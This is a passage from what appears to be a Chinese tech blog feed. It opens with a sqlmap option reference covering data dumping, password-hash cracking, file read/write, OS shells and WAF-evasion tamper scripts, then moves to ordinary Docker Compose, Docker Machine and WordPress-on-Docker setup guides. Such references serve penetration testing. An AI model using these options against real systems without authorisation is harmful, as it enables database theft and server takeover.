优化打开所有优化开关123456-o添加此参数相当于同时添加下列三个优化参数-keep-alive-null-connection-threads=3 预测常见的查询输出1--predict-output 使用持久HTTP(s)连接该参数与-proxy矛盾 1--keep-alive HTTP空连接直接获得HTTP响应的大小而不用获得HTTP响应体 这在布尔型盲注中可以节约很大的带宽。当然这一技术是需要服务器端支持的 与--text-only矛盾 1--null-connection HTTP(s)最大并发数默认为1 1--threads=THREADS 注入指定一个以逗号分隔的，要测试的参数列表该列表中的参数不受level限制 1-p TESTPARAMETER 跳过指定的测试参数1--skip=SKIP 跳过那些看起来不动态的测试参数1--skip-static 从测试中排除参数1--param-exclude=.. 指定数据库管理系统1--dbms=DBMS 指定DBMS身份验证凭据格式：user:password 1--dbms-cred=DBMS 指定运行数据库管理系统的操作系统1--os=OS 生成无效参数值时强制使用大数1--invalid-bignum 生成无效参数值时强制使用逻辑操作符1--invalid-logical 生成无效参数值时强制使用字符串1--invalid-string 关闭payload转换1--no-cast 关闭字符串编码1--no-escape 设置payload的前置字符串1--prefix=PREFIX 设置payload的后缀字符串1--suffix=SUFFIX 使用给定的脚本来修改注入数据除了用CHAR()编码字符串外Sqlmap没有对payload进行任何混淆。 该参数用于对payload进行混淆以绕过IPS或WAF。 该参数后跟一个tamper脚本的名字。 多个tamper脚本之间用空格隔开。 1--tamper=TAMPER 检测指定检测级别，1-5级默认为1级 检测级别不仅会影响payload的使用，还会影响注入点的检测，GET和POST参数是一直会被检测的，检测级别大于等于2时会检测cookie是否有注入，检测级别大于等于3时会检测User-Agent和Referer是否有注入。 1--level=LEVEL 指定风险等级，1-3级默认为1级 风险等级2添加了基于时间的注入测试，等级3添加了OR测试 1--risk=RISK 页面对比默认情况下在布尔型注入中Sqlmap通过比较返回页面内容来判断True或False 指定代表True的页面会包含而代表False的页面不会包含的字符串以供Sqlmap判断True或False 1--string=STRING 指定一个正则表达式去匹配这样的字符串 1--regexp=REGEXP 指出代表False的页面会包含而代表True的页面不会包含的字符串以供Sqlmap判断True或False 1--not-string=NOTSTRING 指定被认为是True时的HTTP代码 1--code=CODE 若是HTTP响应体中有许多诸如JavaScript之类的活动内容，可以使用此参数让Sqlmap只专注于纯文本内容。 1--text-only 就可以使用此参数让Sqlmap依据title来判断True或False 1--titles 技术指定检测注入时所用技术默认情况下Sqlmap会使用自己支持的全部技术进行检测（BEUSTQ） 此参数后跟表示检测技术的大写字母，其值为B、E、U、S、T或Q B：Boolean-based blind（布尔型注入） E：Error-based（报错型注入） U：Union query-based（可联合查询注入） S：Stacked queries（可多语句查询注入） T：Time-based blind（基于时间延迟注入） Q：Inline queries（嵌套查询注入） 1--technique=TECH 基于时间延迟注入中延时设置默认为5秒 1--time-sec=TIMESEC 联合查询注入中列数设置在进行联合查询注入时，Sqlmap会自动检测列数，范围是1到10。 当level值较高时列数检测范围的上限会扩大到50。 1--union-cols=UCOLS 联合查询注入中字符设置默认情况下Sqlmap进行联合查询注入时使用空字符（NULL）。 当level值较高时Sqlmap会生成随机数用于联合查询注入。因为有时使用空字符注入会失败而使用随机数会成功。 1--union-char=UCHAR 联合查询注入中表名设置1--union-from=UFROM DNS泄露攻击1--dns-domain=DNS.. 二阶注入攻击有时注入结果显示在别的页面，此时需要用此参数指明显示注入结果的页面，该参数后跟一个URL 1--second-order=S.. 指纹默认Sqlmap会自动对注入目标进行数据库管理系统指纹识别。 执行更广泛的数据库管理系统指纹识别可以添加此参数 1-f, --fingerprint 枚举列举所有可访问的数据1-a, --all 列举数据库管理系统信息1-b, --banner 列举当前数据库用户1--current-user 列举当前数据库1--current-db 列举服务器主机名1--hostname 检测当前管理员用户是否是管理员若是管理员则返回True，否则返回False 1--is-dba 列举数据库管理系统中的用户1--users 列举并破解数据库管理系统用户密码Hash值1--passwords 列举数据库管理系统的用户权限1--privileges 列举数据库管理系统的用户角色1--roles 列举数据库管理系统中的所有数据库1--dbs 列举-D指定数据库的所有表1--tables 列举-D指定数据库-T指定表的所有列1--columns 列举数据库管理系统的模式1--schema 列举表中数据条数1--count 列举表中数据用参数-D指定数据库，用参数-T指定数据表，用参数-C指定目标列 1--dump 列举所有数据库所有表中所有数据1--dump-all 在数据库、表、列中搜索123456--search参数“–search”要和下列参数之一配合使用：-C：后跟以逗号分隔的列名，在整个数据库管理系统中搜索-T：后跟以逗号分隔的表名，在整个数据库管理系统中搜索-D：后跟以逗号分隔的库名，在整个数据库管理系统中搜索 列举数据库管理系统中的注释1--comments 在列举表时排除数据库管理系统中的系统数据库1--exclude-sysdbs 主列名称1--pivot-column=P.. 限制列举的数据此参数会被Sqlmap转换成WHERE子句 1--where=DUMPWHERE 列举指定开始位置后的数据(不包含指定位置)1--start=LIMITSTART 列举指定结束位置前的数据(包含指定位置)1--stop=LIMITSTOP 第一个查询输出字字符1--first=FIRSTCHAR 最后一个查询输出字字符1--last=LASTCHAR 指定要执行的SQL语句1--sql-query=QUERY 提供一个交互式的SQL语句执行环境支持Tab键补全和命令历史记录 1--sql-shell 从给定文件执行SQL语句1--sql-file=SQLFILE 用参数-D指定数据库，用参数-T指定数据表，用参数-C指定目标列，用参数-U指定数据库用户 暴力破解检查公共表的存在1--common-tables 检查公共列的存在1--common-columns 用户定义函数注入(UDF注入)注入自定义用户定义函数1--udf-inject 指定共享库的本地路径1--shared-lib=SHLIB 文件系统访问读取文件1--file-read=RFILE 写入文件1--file-write=WFILE 写入文件至绝对路径1--file-dest=DFILE 操作系统访问执行操作系统命令1--os-cmd=OSCMD 模拟一个可以执行任意命令的系统shell可以用Tab键补全，支持历史记录 1--os-shell 模拟一个OOB shell,Meterpreter或VNC1--os-pwn 一次点击提示用于OOB shell,Meterpreter或VNC1--os-smbrelay 存储过程缓冲区溢出1--os-bof 数据库过程用户权限升级1--priv-esc 指定安装Metasploit框架的本地路径1--msf-path=MSFPATH 指定临时文件目录的远程绝对路径1--tmp-path=TMPPATH Windows注册表访问阅读Windows注册表的键值1--reg-read 写入一个Windows注册表键值数据1--reg-add 删除一个Windows注册表的键值1--reg-del 指定Windows注册表键值的路径1--reg-key=REGKEY 指定Windows注册表键值的键1--reg-value=REGVAL 指定Windows注册表键值的值1--reg-data=REGDATA 指定Windows注册表键值的值的数据类型1--reg-type=REGTYPE 通用选项从SQLite文件中载入Sqlmap会话Sqlmap会自动地为每一个目标创建长久保存的会话SQLite文件，该文件统一存储在特定目录中，其中保存着恢复会话所需的所有数据。 1-s SESSIONFILE 将HTTP(S)流量记录到日志文件中1-t TRAFFICFILE 非交互模式使用该参数可以让Sqlmap以非交互模式运行，所有要求的输入都会取默认值。 1--batch 指定结果字段具有二进制值1--binary-fields=.. 在评估目标之前检查互联网连接1--check-internet 从目标URL开始爬取目标站点1--crawl=CRAWLDEPTH 排除不想爬取的URL支持正则 1--crawl-exclude=.. 设置输出CSV文件中的分隔符默认以,分隔 1--csv-del=CSVDEL 设置字符编码1--charset=CHARSET 设置数据输出格式支持CSV (默认), HTML 或 SQLITE 1--dump-format=DU.. 设置用于数据检索的字符编码1--encoding=ENCOD.. 显示估计的完成时间1--eta 为当前目标刷新会话文件以避免Sqlmap默认的缓存机制可能造成的一些问题 1--flush-session 测试表单数据是否存在注入点1--forms 忽略会话文件中的查询结果重新执行查询1--fresh-queries 将所有HTTP流量记录到一个HAR文件中1--har=HARFILE 对返回结果以十六进制返回1--hex 指定输出目录路径1--output-dir=OUT.. 从响应中解析DBMS的错误信息1--parse-errors 保存选项到配置文件中该文件可编辑并且可以使用参数-c加载 配置文件是INI格式的 1--save=SAVECONFIG 从提供的代理日志中过滤目标1--scope=SCOPE 通过关键词选择使用的payload或titles1--test-filter=TE.. 通过某关键词不使用某些payload或titles1--test-skip=TEST.. 升级sqlmap1--update 杂项使用简写1-z MNEMONICS 在成功检测到注入点时报警后跟一个用于发出警报的命令 1--alert=ALERT 设置问题的回答使用–batch以非交互模式运行时所有问题都以按默认值作为回答。有时不想以默认值为答案又想使用非交互模式，此时可以使用此参数对特定问题进行回答，若回答多个问题，以逗号分隔。 1--answers=ANSWERS 在成功检测到注入点时发出“嘟”声1--beep 清除Sqlmap创建的临时表和自定义函数1--cleanup 检查依赖用此参数可以检查依赖的第三方库是否安装 1--dependencies 关闭彩色输出1--disable-coloring 指定使用Google dork结果的某页1--gpage=GOOGLEPAGE 彻底检测WAF/IPS/IDS1--identify-waf 模仿智能手机1--mobile 离线模式（仅仅使用会话数据）Sqlmap将仅仅使用以前存储的会话数据做测试而不向目标发送任何数据包 1--offline 从输出目录中安全移除所有内容1--purge-output 对waf/ip/ids保护,跳过启发式检测默认地Sqlmap会发送虚假的SQL注入playload以试探目标是否有保护措施 1--skip-waf 快速扫描目的是尽快找出其中存在的某些注入点而有所遗漏也没有关系时可以使用此参数进行正向启发式扫描。此时只有让数据库管理系统报错的参数才会做进一步测试，其余URL均被跳过。 1--smart 交互式Sqlmap Shell打开一个交互式的Sqlmap Shell，支持历史记录 1--sqlmap-shell 指定用于存储临时文件的本地目录1--tmp-dir=TMPDIR 指定Web服务器文档根目录1--web-root=WEBROOT 为初学者准备的简单向导1--wizard Sqlmap常用脚本apostrophemask.py将引号替换为UTF-8，用于过滤单引号的情况 base64encode.py替换为base64编码 multiplespaces.py围绕SQL关键字添加多个空格 space2plus.py用+替换空格 nonrecursivereplacement.py用双重叠写语句替换预定义的SQL关键字 space2randomblank.py将空格替换为其他有效字符 unionalltounion.py将union all select替换为union select securesphere.py追加特制的字符串 space2hash.py将空格替换为#，并添加一个随机字符串和换行符 space2mssqlblank.py针对mssql数据库，将空格替换为其他空符号 space2mssqlhash.py针对mssql数据库，将空格替换为#，并添加一个换行符 between.py用not between 0 and 替换&gt;，用between and替换= percentage.pyASP中，允许在每个字符前添加一个% sp_password.py从DBMS日志的自动模糊处理的payload中追加sp_password charencode.py对给定的payload全部字符使用URL编码(不处理已经编码的字符) randomcase.py随机大小写 charunicodeencode.py字符串unicode编码 space2comment.py将空格替换为/**/ equaltolike.py将=替换为like greatest.py用于绕过对&gt;的过滤，用greatest替换&gt; ifnull2ifisnull.py用于绕过对ifnull的过滤，替换类似ifnull(A,B)为if(isnull(A),B,A) modsecurityversioned.py过滤空格，使用mysql内联注释的方式进行注入 space2mysqlblank.py针对mysql，将空格替换为其他空白符号 modsecurityzeroversioned.py使用mysql内联注释的方式注入 space2mysqldash.py将空格替换为--，并添加一个换行符 bluecoat.py在SQL语句之后用有效的随机空白符替换空格符，随后用like替换= versionedkeywords.py注释绕过 halfversionedmorekeywords.py用于数据库为mysql时绕过防火墙，在每个关键字之前添加mysql版本的注释 space2morehash.py将空格替换为#，并添加一个随机字符串和换行符 apostrophenullencode.py用非法双字节unicode字符替换单引号 appendnullbyte.py在有效payload的结束位置加载零字节字符编码 chardoubleencode.py对给定的payload全部字符使用双重URL编码(不处理已经编码的字符) unmagicquotes.py用一个多字节组合(%bf%27)和末尾通用注释一起替换空格 randomcomments.py用/**/分割SQL关键字 参考连接https://blog.csdn.net/wn314/article/details/78872828]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker三剑客之Docker Compose]]></title>
    <url>%2F2018%2F08%2F18%2FDocker%E4%B8%89%E5%89%91%E5%AE%A2%E4%B9%8BDocker-Compose%2F</url>
    <content type="text"><![CDATA[编排功能是复杂系统实现灵活可操作性的关键。在Docker中，编排意味着用户可以灵活的对各种容器资源实现定义和管理 Compose可以让用户通过编写一个简单的模板文件，快速的创建和管理基于Docker容器的应用集群 简介Compose定位是：定义和运行多个Docker容器的应用 使用Dockerfile模板文件，可以让用户方便的定义一个单独的应用容器 Compose允许用户通过一个单独的docker-compose.yml模板文件(YAML格式)来定义一组相关联的应用容器为一个项目 Compose中的概念： 服务：一个应用的容器，实际上可以包含若干个运行相同镜像的容器实例 项目：由一组关联的应用容器组成的一个完整的业务单元，在docker-compose.yml文件中定义 Compose的默认管理对象是项目，通过子命令对项目中的一组容器进行便捷的生命周期管理 Compose实现上调用了Docker服务提供的API来对容器进行管理 安装与卸载安装Compose之前，先安装Docker Compose可以通过pip工具进行安装，下载编译好的二进制文件直接使用，直接运行在Docker容器中 前两种方式为传统方式，适合本地环境安装使用；第三种则不破坏系统环境，更适合云计算场景 pip安装将Compose当作一个Python应用来从pip源中安装 1pip install -U docker-compose 之后可以添加docker-compose的bash补全命令 1curl -L https://raw.githubusercontent.com/docker/compose/1.8.0/contrib/completion/bash/docker-compose &gt; /etc/bash_completion.d/docker-compose 二进制包12curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-Linux-x86_64 &gt; /usr/local/bin/docker-composechmod a+x /usr/local/bin/docker-compose 测试是否安装成功 1docker-compose version 容器中运行12curl -L https://github.com/docker/compose/releases/download/1.22.0/run.sh &gt; /usr/local/bin/docker-composechmod a+x /usr/local/bin/docker-compose run.sh执行，其实是下载了docker/compose镜像并运行 卸载二进制包安装方式直接删除二进制文件即可 1rm /usr/local/bin/docker-compose pip安装方式1pip uninstall docker-compose Compose命令对于Compose来说，大部分命令的对象既可以是项目本身，也可以是指定为项目中的服务或者容器 格式：docker-compose [-f=&lt;tag&gt;...] [options] [command] [args...] 命令选项： -f,--file FILE：指定使用的Compose模板文件，默认为docker-compose.yml,可多次指定 -p,--project-name NAME：指定项目名称，默认使用所在目录名称作为项目名 --x-networking：使用Docker的可拔插网络后端特性 --x-networking-driver DRIVER：制定网络后端的驱动，默认为bridge --verbose：输出更多调试信息 -v,--version：打印版本并退出 build格式：docker-compose build [options] [SERVICE...] 构建（重构）项目中的服务容器 选项： --force-rm：删除构建过程中的临时容器 --no-cache：构建镜像过程中不使用缓存 --pull：始终尝试通过拉取操作来获取更新版本镜像 help获得一个命令的帮助 kill格式：docker-compose kill [options] [SERVICE...] 通过发送SIGKILL信号来强制停止服务容器 支持通过-s参数来指定发送的信号 logs格式：docker-compose logs [options] [SERVICE...] 查看服务容器的输出 pause格式：docker-compose pause [SERVICE...] 暂停一个服务容器 port格式：docker-compose port [options] SERVICE PRIVATE_PORT 显示某个容器端口所映射的公共端口 选项： --protocol=proto：指定端口协议，默认TCP --index=index：如果同一服务器存在多个容器，指定命令对象为容器序号(默认为1) ps格式：docker-compose ps [options] [SERVICE...] 列出项目中目前的所有容器 选项： -q：只打印容器的ID信息 pull格式：docker-compose pull [options] [SERVICE...] 拉取服务依赖的镜像 选项： --ignore-pull-failures：忽略拉取镜像过程中的错误 restart格式：docker-compose restart [options] [SERVICE...] 重启项目中的服务 选项： -t,--timeout TIMEOUT：指定重启前停止容器的超时(默认10秒) rm格式：docker-compose rm [options] [SERVICE...] 删除所有(停止状态的)服务容器 选项： -f,--force：强制删除 -v：删除容器所挂载的数据卷 run格式：docker-compose run [options] [-p PORT...] [-e KEY=VAL...] SERVICE [COMMAND] [ARGS...] 在指定服务上执行一条命令 默认，如果存在关联，则所有关联的服务将会自动启动，除非这些服务已在运行中 该命令类似于启动容器后运行指定的命令。数据卷，链接等都会按配置自动创建 有两个不同点： 给定命令将会覆盖原有的自动运行命令 不会自动创建端口，避免冲突 可使用--no-deps选项，不自动启动关联的容器 选项： -d：后台运行服务容器 --name NAME：指定容器名 --entrypoint CMD：覆盖默认的容器启动指令 -e KEY=VAL：设置环境变量，可多次使用此选项 -u,--user=&quot;&quot;：指定运行容器的用户名或uid --no-deps：不自动启动关联的服务容器 --rm：运行命令后自动删除容器，不可与-d同时使用 -p,--publish=[]：映射端口 --service-ports：配置服务端口并映射到本地主机 -T：不分配伪tty，意味着依赖tty的指令将无法运行 scale格式：docker-compose scale [options] [SERVICE=NUM...] 设置指定服务运行的容器个数 例：docker-compose scale web=3 db=2 一般情况下，当指定容器数目多于该服务当前实际运行容器个数，将新创建并启动容器；反之，将停止容器 选项： -t,--timeout TIMEOUT：停止容器时的超时时间(默认10秒) start格式：docker-compose start [SERVICE...] 启动已经存在的服务容器 stop格式：docker-compose stop [options] [SERVICE...] 停止处于运行状态的容器 选项： -t,--timeout TIMEOUT：停止容器时的超时时间(默认10秒) unpause格式：docker-compose unpause [SERVICE...] 恢复处于暂停状态的服务 up格式：docker-compose up [options] [SERVICE...] 该命令将尝试自动完成包括构建镜像，创建和重建服务，启动服务，关联服务相关容器的一系列操作。链接的服务都将会被自动启动，除非已经处于运行状态 默认，此命令启动的容器都运行在前台，控制台将会同时打印所有容器的输出信息 默认，如果服务容器已存在，此命令会尝试停止容器，然后重新创建，以保证新启动的服务匹配docker-compose.yml文件最新内容 选项： -d：在后台运行服务容器 --no-color：不使用颜色来区分不同服务的控制台输出 --no-deps：不启动服务所链接的容器,用于重新部署某个服务，不影响其所依赖的服务 --force-recreate：强制重新创建容器，不可与--no-recreate同时使用 --no-recreate：如果容器存在，则不重新创建，不可与--force-recreate同时使用 --no-build：不自动构建缺失的服务镜像 -t,--timeout TIMEOUT：停止容器时的超时时间(默认10秒) migrate-to-labels格式：docker-compose migrate-to-labels 重新创建容器，并添加label。添加缺失的容器标签 version格式：docker-compose version 打印版本信息 Compose环境变量COMPOSE_PROJECT_NAME设置Compose的项目名称，默认为当前工作目录(docker-compose.yml文件所在目录)的名称 Compose会为每一个启动的容器前添加的项目名称 COMPOSE_FILE设置要使用的docker-compose.yml的路径 COMPOSE_API_VERSION通过指定API版本来临时解决Compose发出的Docker请求版本可能Docker服务端并不支持的问题 DOCKER_HOST设置Docker服务器的监听地址 DOCKER_TLS_VERIFY如果该环境变量不为空，则与Docker服务端的所有交互都通过TLS协议进行加密 DOCKER_CERT_PATH配置TLS通信所需要的验证文件的路径，默认为~/.docker COMPOSE_HTTP_TIMEOUTCompose发送往Docker服务端的请求的超时，默认60秒 Compose模板文件默认的模板文件名称为docker-compose.yml,格式为YAML格式 在版本1中，其中每个顶级元素为服务名称，次级元素为服务容器的配置信息 123456webapp: image: examples/web ports: - &quot;80:80&quot; volumes: - &quot;/data&quot; 版本2中，除了可以声明网络和存储信息外，最大的不同是： 添加了版本信息 需要将所有的服务放到services根下面 12345678version: &quot;2&quot;services: webapp: image: examples/web ports: - &quot;80:80&quot; volumes: - &quot;/data&quot; 每个服务都必须通过image指令指定镜像或build指令(需要Dockerfile)等来自动构建生成镜像 如果使用build指令，在Dockerfile中设置的选项将会自动被获取，无需在docker-compose.yml中再次设置 build指定Dockerfile所在的目录路径(绝对路径或者相对路径)，Compose将会利用它自动构建镜像，然后使用这个镜像 1build: /path/to/build/dir cap_add,cap_drop指定容器的内核能力分配 让容器拥有所有能力 12cap_add: - ALL 去掉NET_ADMIN能力 12cap_drop: - NET_ADMIN command覆盖容器启动后默认执行的命令 1command: echo &quot;hello&quot; cgroup_parent指定父cgroup组，意味着将继承该组的资源限制 1cgroup_parent: cgroups_1 container_name指定容器名称，默认“项目名称服务名称序号”格式 指定容器名称后，该服务无法进行扩展，因Docker不允许多个容器具有相同的名称 1container_name: docker-web-container devices指定设备映射关系 12devices: - &quot;/dev/ttyusb1:/dev/ttyusb0&quot; dns自定义DNS服务器。可以是一个值，也可以是一个列表 12345dns: 8.8.8.8dns: - 8.8.8.8 - 9.9.9.9 dns_search配置DNS搜索域 12345dns_search: example.comdns_search: - domain1.example.com - domain2.example.com dockerfile指定额外的编译镜像的Dockerfile文件 不可与image指令同时使用 1dockerfile: ... env_file从文件中获取环境变量 如果通过docker-compose -f FILE方式指定Compose模板文件，则env_file中变量的路径会基于模板文件的路径 如果有变量名称与environment指令冲突，则以environment为准 123456env_file: .envenv_file: - ./common.env - ./apps/web.env - ./opt/secrets.env 环境变量文件每一行必须符合格式，支持#开头的注释行 12# common.envPROG_ENV=development environment设置环境变量，数组或字典格式 只给定名称的变量会自动获取运行Compose主机上对应变量的值，用来防止泄露不必要的数据 123environment: RACK_ENV: development SESSION_SECRET: 如果变量名称或者值中用到true|false,yes|no等布尔值，最好放到引号里 expose暴露端口，但不映射到宿主机，只允许能被连接的服务访问 仅可以指定内部端口为参数 123expose: - &quot;3000&quot; - &quot;8000&quot; extends基于其他模板文件进行扩展 123extends: file: common.yml #其他模板文件 service: webapp #其他模板文件中的服务 会自动继承common.yml中的webapp服务及环境变量定义 注意： 避免出现循环依赖，例如A依赖B，B依赖C，C依赖A的情况 extends不会继承links和volumes_from中定义的容器和数据卷资源 external_links链接到docker-compose.yml外部的容器，甚至可以是非Compose管理的外部容器 123external_links: - readis - mysql extra_hosts指定额外的host名称映射信息，类似于Docker中的--add-host参数 123extra_hosts: - &quot;googledns:8.8.8.8&quot; - &quot;dockerhub:52.1.157.61&quot; 会在启动后的服务容器中/etc/hosts文件中添加如下条目 128.8.8.8 googledns52.1.157.61 dockerhub image指定为镜像名称或镜像ID，如果镜像不存在，Compose将会尝试拉取这个镜像 12image: ubuntuimage: a4bc labels为容器添加Docker元数据信息 12labels: com.startupteam.release: &quot;rc3 for v1&quot; links链接到其他服务中的容器 使用服务名称或服务别名或“服务名称:服务别名” 1234links: - db - db:database - redis 使用的别名将会自动在服务容器中的/etc/hosts中创建 所连接容器中相应的环境变量也将创建 log_driver指定日志驱动类型，支持三种日志驱动类型，类似于Docker中的--log-driver参数 123log_driver: &quot;json-file&quot;log_driver: &quot;syslog&quot;log_driver: &quot;none&quot; log_opt日志驱动的相关参数 123log_driver: &quot;syslog&quot;log_opt: syslog-address: &quot;tcp://192.168.0.42:123&quot; net设置网络模式，类似于docker client的--net参数 1net: &quot;bridge&quot; pid跟主机系统共享进程命名空间 打开该选项的容器之间，以及容器与宿主机系统之间可以通过进程ID来相互访问和参数 1pid: &quot;host&quot; ports暴露端口信息 “宿主机:容器”格式或仅指定容器的端口(宿主机会选择随机端口) 1234ports: - &quot;3000&quot; - &quot;80:80&quot; - &quot;127.0.0.1:8000:8000&quot; security_opt指定容器模板标签(label)机制的默认属性(用户，角色，类型，级别等) 123security_opt: - label:user:USER - label:role:ROLE ulimits指定容器的ulimits限制值 最大进程数65535，文件句柄数20000(软限制，应用可随时更改，不可超过硬限制)和40000(系统硬限制，只能root用户提高)12345ulimits: nproc: 65535 nofile: soft: 20000 hard: 40000 volumes数据卷所挂载路径设置 1234volumes: - /var/lib/mysql - cache/:/tmp/cache - ~/configs:/etc/configs/:ro volumes_driver数据卷的插件驱动 用户可以先使用第三方驱动创建一个数据卷，然后使用名称来访问它 通过volumes_driver来指定驱动 1volumes_driver: mydriver volumes_from从另一个服务或容器挂载它的数据卷 123volumes_from: - service_name - container_name 其他指令指定使用CPU核0和核1，只是用50%资源 12cpuset: 0,1cpu_shares: 50 指定服务容器启动后执行的命令 1entrypoint: /code/entrypoint.sh 指定容器中运行应用的用户名 1user: nginx 指定容器中工作目录 1working_dir: /code 指定容器中搜索域名，主机名，mac地址等 123domainname: your_website.comhostname: testmac_address: ... 指定容器 1ipc: host 指定容器中内存和内存交换区限制 12mem_limit: 1gmemswap_limit: 1g 允许容器中运行一些特权命令 1privileged: true 指定容器退出后的重启策略 1restart: always 以只读模式挂载容器的root文件系统 1read_only: true 打开标准输入，可以接受外部输入 1stdin_open: true 模拟一个假的远程控制台 1tty: true 读取环境变量Compose模板文件支持动态读取主机的系统环境变量 从运行模板文件的环境中读取变量${MONGO_VERSION}的值，并将其写入执行的指令中 12db: image: &quot;mongo:$&#123;MONGO_VERSION&#125;&quot;]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker三剑客之Docker Machine]]></title>
    <url>%2F2018%2F08%2F18%2FDocker%E4%B8%89%E5%89%91%E5%AE%A2%E4%B9%8BDocker-Machine%2F</url>
    <content type="text"><![CDATA[负责使用Docker的第一步，在多种平台上快速安装Docker环境。让用户可以在很短时间内搭建一套Docker主机集群 简介Machine负责对Docker主机本身进行管理 Machine项目由Go语言编写，用户可以在本地任意指定被Machine管理的Docker主机，并对其进行操作 功能： 在指定节点安装Docker引擎，配置其为Docker主机 集中管理所有Docker主机 Machine连接不同类型的节点是通过不同的驱动制定的 安装MachineDocker Machine支持多平台 Linux平台安装推荐从官方Release库直接下载编译好的二进制文件即可 123456curl -L https://github.com/docker/machine/releases/download/v0.12.2/docker-machine-Linux-x86_64 &gt; machine.zip &amp;&amp; \unzip machine.zip &amp;&amp; \rm machine.zip &amp;&amp; \mv -f docker-machine* /usr/local/binchmod +x /usr/local/bin/docker-machine* 验证安装 1docker-machine -v Windows平台安装首先安装git-bash git-bash中，仍然通过下载二进制包方式安装Docker Machine 12345if [[ ! -d &quot;$HOME/bin&quot; ]]; then mkdir -p &quot;$HOME/bin&quot;; fi &amp;&amp; \curl -L https://github.com/docker/machine/releases/download/v0.12.2/docker-machine-Linux-x86_64 &gt; machine.zip &amp;&amp; \unzip machine.zip &amp;&amp; \rm machine.zip &amp;&amp; \mv -f docker-machine* &quot;$HOME/bin&quot; 使用MachineDocker Machine通过多种后端驱动来管理不同的资源，包括虚拟机，本地主机和云平台等 通过-d选项可以选择支持的驱动类型 虚拟化平台可以通过virtualbox驱动支持本地（需安装virtualbox）启动一个虚拟机并配置为Docker主机 1docker-machine create --driver=virtualbox vbox-instance 这将启动一个全新的虚拟机，并安装Docker引擎 支持Hyper-V虚拟化平台 本地主机要求本地主机安装操作系统和SSH服务 且确保本地主机可以通过user账号的key直接通过ssh连到目标主机 使用generic类型的驱动，注册一台Docker主机，命名为test 1docker-machine create -d generic --generic-ip-address=目标IP --generic-ssh-user=user test Machine通过SSH连接到指定节点，并在上面安装Docker引擎 通过docker-machine ls命令查看注册到本地管理列表中的Docker主机 云平台驱动 Machine命令格式：docker-machine &lt;command&gt; active格式：docker-machine active [arg...] 查看当前激活状态的Docker主机 激活状态意味着当前machine主机的DOCKER_HOST环境变量指向该主机 config格式：docker-machine config [OPTIONS] [tag...] 查看到激活Docker主机的连接信息 create格式：docker-machine create [OPTIONS] [tag...] 创建一个Docker主机 参数： --driver,-d &quot;none&quot;：指定驱动类型 --engine-install-url &quot;https://get.docker.com&quot;：配置Docker主机时的安装URL --engine-opt option：以键值对格式指定所创建Docker引擎的参数 --engine-insecure-registry option：以键值对格式指定所创建Docker引擎允许访问不支持认证的注册仓库服务 --engine-registry-mirror option：指定注册仓库镜像 --engine-label option：为所创建的Docker引擎添加标签 --engine-storage-driver：存储后端驱动类型 --engine-env option：指定环境变量 --swarm：指定使用Swarm --swarm-image &quot;swarm:latest&quot;：使用Swarm时采用的镜像 --swarm-master：配置机器作为Swarm集群的master节点 --swarm-discovery：Swarm集群的服务发现机制参数 --swarm-strategy &quot;spread&quot;：Swarm默认调度策略 --swarm-opt option：任意传递给Swarm的参数 --swarm-host &quot;tcp://0.0.0.0:3376&quot;：指定地址将监听Swarm master节点请求 --swarm-addr：从指定地址发送广播加入Swarm集群服务 --swarm-experimental env格式：docker-machine env [OPTIONS] [tag...] 显示连接到某个主机需要的环境变量 inspect格式：docker-machine inspect [OPTIONS] [tag...] 以json格式输出指定Docker主机的详细信息 ip格式：docker-machine ip [tag...] 获取指定Docker主机地址 kill格式：docker-machine kill [tag...] 直接杀死指定Docker主机 指定Docker主机会强行停止 ls格式：docker-machine ls [OPTIONS] [tag...] 列出所有管理的主机 参数： --quiet,-q：减少无关输出信息 --filter option：只输出符合过滤条件的主机，支持多条此参数；支持正则，驱动类型，Swarm管理节点名称，状态等]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[腾讯云+Docker+WordPress]]></title>
    <url>%2F2018%2F08%2F15%2F%E8%85%BE%E8%AE%AF%E4%BA%91-Docker-WordPress%2F</url>
    <content type="text"><![CDATA[环境腾讯云服务器 Ubuntu16.04 LTS 64位 Ubuntu16.04 环境下安装Docker64位，内核版本不低于3.10 准备安装环境12345apt-get install \ apt-transport-https \ ca-certificates \ curl \ software-properties-common 添加docker的官网GPG秘钥1curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 添加apt源1234add-apt-repository \ &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable&quot; 安装12apt-get updateapt-get install -y docker.io 启动docker服务1service docker start 验证安装1docker version 搭建WordPress拉取wordpress和mysql官方镜像12docker pull wordpressdocker pull mysql 启动容器12docker run --name mysql_wordpress -e MYSQL_ROOT_PASSWORD=123456 -d mysqldocker run -d --link mysql_wordpress:mysql -p 81:80 wordpress 访问1http://云服务器公网IP:81 接下来对WordPress进行设置即可 nginx反向代理配置拉取nginx官方镜像1docker pull nginx 创建nginx临时容器1docker run -d -p 80:80 nginx 将容器中的配置文件复制到本地目录1docker cp container_name_id:/etc/nginx/ /opt/local 如果不先将配置文件复制出来，在下一步中nginx配置文件不会挂载到本地主机,只会创建一个新目录。 创建nginx容器首先将上面创建的临时nginx容器删除 然后创建容器 1docker run -d --name nginx_wordpress -p 80:80 -v /opt/local/nginx/logs:/var/log/nginx -v /opt/local/nginx:/etc/nginx nginx 挂载了两个目录到本地主机，一个是配置文件(etc/nginx),挂载至本地主机/opt/local/nginx；另一个是日志文件(/var/log/nginx),挂载至本地主机/opt/local/nginx/logs 验证容器启动访问 1http://云服务器公网IP 显示nginx欢迎页面即可 配置反向代理本地主机执行(对目录进行了挂载，修改会直接反映到容器中) 12cd /opt/local/nginx/conf.d/vim default.conf default.conf 文件内容(其他内容不做修改) 12345678server &#123; listen 80; server_name 云主机IP; location / &#123; proxy_pass http://云主机IP:81; # 实际请求后台地址 &#125;&#125; 重启nginx容器 1docker restart mynginx 访问 1http://云服务器公网IP 即可实现不指定端口访问WordPress]]></content>
      <categories>
        <category>Docker技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[配置私有仓库]]></title>
